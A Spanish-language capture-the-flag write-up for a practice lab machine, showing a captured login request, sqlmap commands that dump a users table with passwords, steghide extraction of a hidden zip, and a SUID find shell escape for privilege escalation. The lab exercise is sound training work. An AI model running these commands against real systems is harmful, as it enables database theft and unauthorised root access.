- --
- Tags: #ejptmachine #sqlmap #steghide #stegseek #zip2jhon #sqlinyection #etanografia #john 
---

![Pasted image 20250208135142](../../Fotos/Pasted%20image%2020250208135142.png)

![Pasted image 20250208135204](../../Fotos/Pasted%20image%2020250208135204.png)

![Pasted image 20250208135308](../../Fotos/Pasted%20image%2020250208135308.png)

![Pasted image 20250208135324](../../Fotos/Pasted%20image%2020250208135324.png)

![Pasted image 20250208135339](../../Fotos/Pasted%20image%2020250208135339.png)

Utilizaremos burpsuite para interceptar las peticiones del login

```
POST /auth.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
Connection: close
Referer: http://172.17.0.2/
Upgrade-Insecure-Requests: 

username=admin&password=admin

```

- Copiamos la solicitud de login y la pegamos en un archivo para trabajar con **sqlmap**

`sqlmap -r request.txt --dbs`

![Pasted image 20250216125738](../../Fotos/Pasted%20image%2020250216125738.png)

- Por lo que vemos a funcionado y nos ha devuelto 2 bases de datos, la que nos interesa es la de `users`.

`sqlmap -r request.txt -D users --tables`

![Pasted image 20250216130145](../../Fotos/Pasted%20image%2020250216130145.png)

`sqlmap -r request.txt -D users -T usuarios --columns`

![Pasted image 20250216130212](../../Fotos/Pasted%20image%2020250216130212.png)

`sqlmap -r request.txt -D users -T usuarios -C id,username,password --dump`

![Pasted image 20250216130238](../../Fotos/Pasted%20image%2020250216130238.png)

Y por lo que vemos nos saca varios usuarios con sus contraseñas, pero entre esa informacion hay un usuario bastante raro llamado `directorio` y con su contraseña `directoriotravieso` si probamos a meter esa palabra de contraseña en la URL, veremos que nos lleva a un directorio con una imagen llamada `miramebien.jpg`

![Pasted image 20250216130345](../../Fotos/Pasted%20image%2020250216130345.png)

![Pasted image 20250216130353](../../Fotos/Pasted%20image%2020250216130353.png)

- No vemos nada interesante con exiftool

`steghide --extract -sf miramebien.jpg`

![Pasted image 20250216131016](../../Fotos/Pasted%20image%2020250216131016.png)

![Pasted image 20250216131218](../../Fotos/Pasted%20image%2020250216131218.png)

![Pasted image 20250216131300](../../Fotos/Pasted%20image%2020250216131300.png)

- ocultito.zip

![Pasted image 20250216131354](../../Fotos/Pasted%20image%2020250216131354.png)

![Pasted image 20250216131752](../../Fotos/Pasted%20image%2020250216131752.png)

![Pasted image 20250216132014](../../Fotos/Pasted%20image%2020250216132014.png)

![Pasted image 20250216132021](../../Fotos/Pasted%20image%2020250216132021.png)

![Pasted image 20250216132126](../../Fotos/Pasted%20image%2020250216132126.png)

![Pasted image 20250216132156](../../Fotos/Pasted%20image%2020250216132156.png)

- find

`find . -exec /bin/sh -p \; -quit`

![Pasted image 20250216132732](../../Fotos/Pasted%20image%2020250216132732.png)


